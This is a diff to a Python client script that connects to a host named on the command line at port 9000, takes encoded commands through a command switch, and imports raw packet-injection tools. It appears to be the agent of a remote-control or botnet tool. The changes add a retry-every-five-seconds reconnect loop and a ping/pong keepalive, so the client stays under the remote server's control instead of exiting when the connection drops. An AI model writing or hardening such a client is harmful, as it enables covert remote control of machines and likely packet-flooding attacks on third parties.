@@ -18,9 +18,28 @@ from socket import socket, IPPROTO_UDP, IPPROTO_RAW, SOCK_DGRAM, SOCK_STREAM, SO
 from socket import error as sock_error
 from pinject import UDP, IP
 
+address = None
 
 VERSION = "v0.0.6-full"
 
+def reconnect(sock=None):
+    global address
+
+    if not sock is None:
+        sock.close()
+    sock = socket(AF_INET, SOCK_STREAM)
+
+    while True:
+        try:
+            sock.connect((address, 9000))
+        except ConnectionRefusedError:
+            sleep(5)
+        else:
+            if make_en_stdout(VERSION, sock) == 1:
+                sysexit()
+            break
+
+    return sock
 
 def get_len(in_string, max_len):
     """Calculate string length, return as a string with trailing 0s.
@@ -49,8 +68,7 @@ def make_en_stdout(stdout, sock):
     try:
         sock.send(en_stdout)
     except sock_error:
-        sock.close()
-        return 1
+        return make_en_stdout(stdout, reconnect(sock))
     return 0
 
 
@@ -67,9 +85,7 @@ def make_en_bin_stdout(stdout, sock):
     try:
         sock.send(en_stdout)
     except sock_error:
-        # NOTE: Lost connection with server. Should try to reconnect
-        sock.close()
-        return 1
+        return make_en_bin_stdout(stdout, reconnect(sock))
     return 0
 
 
@@ -85,11 +101,13 @@ def get_en_data(sock, size):
     """Get data, return string."""
     data = sock.recv(size)
     if data == b'':
-        # NOTE: Lost connection with server. Should try to reconnect
-        sock.close()
-        sysexit()
+        return get_en_data(reconnect(sock), size)
 
-    return make_en_data(data).decode('UTF-8')
+    result = make_en_data(data).decode('UTF-8')
+    if result == "ping":
+        make_en_stdout("pong", sock)
+        return get_en_data(sock, size)
+    return result
 
 
 def get_en_bin_data(sock, size):
@@ -348,19 +366,14 @@ COMM_SWTCH = {
 
 
 def main():
+    global address
+
     try:
-        rhost = argv[1]
-        rport = 9000
+        address = argv[1]
     except IndexError:
-        print ("Must provide hotst")
+        print ("Must provide host")
         sysexit()
-
-    sock = socket(AF_INET, SOCK_STREAM)
-    sock.connect((rhost, rport))
-
-    en_stdout = make_en_stdout(VERSION, sock)
-    if en_stdout == 1:
-        sysexit()
+    sock = reconnect()
 
     while True:
         en_data = get_en_data(sock, 5)
